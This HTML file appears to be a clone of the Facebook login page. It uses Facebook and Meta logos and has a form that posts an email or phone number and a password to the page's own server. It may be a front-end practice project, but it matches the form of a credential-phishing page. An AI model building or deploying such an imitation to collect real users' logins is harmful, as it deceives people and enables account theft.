<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Liter&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Lexend+Giga:wght@100..900&display=swap" rel="stylesheet">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sing up</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
        <header>
            <div class="language">
                <p>
                    English (UK)
                </p>
            </div>
        </header>   
          <div class="img">
                <img src="/img/2023_Facebook_icon.svg.png"  alt="">
            </div>
        <main>
            <div class="inputs">
                <form action="/" method="post">
                    <i for="numberOrEmail" class="fa-regular fa-x delete display-n " id="delete"></i>
                    <input type="text" class="name" name="numberOrEmail" id="numberOrEmail">
                    <label class="name_label" for="numberOrEmail">Mobile number or email address</label>
                    <span class="eye display-n" id="eyes"><i class="fa-regular fa-eye-slash "></i></span>
                    <input type="password" class="password" name="password" id="password">
                    <label class="password_label" for="password">Password</label>
                    <input type="submit" class="submit" value="Log in">
                   </form>
                    <div class="forget">
                    <!-- <i class="fa-regular fa-eye eyes"></i> -->
                    <p id="Forgotten">Forgotten Password?</p>
                </div>
            </div>
        </main>
        <footer>
            <div class="create_acc">
                <button id="createAccount">Create new account</button>
            </div>
            <div class="meta_logo">
                <img src="img/meta_platforms-logo_brandlogos.net_amvru-300x300.png" alt="">
            </div>
            <div class="more">
                <a href="">About</a>
                <a href="">Help</a>
                <a href="">More</a>
            </div>
        </footer>
        <script src="/js/js.js"> </script>
</body>
</html>
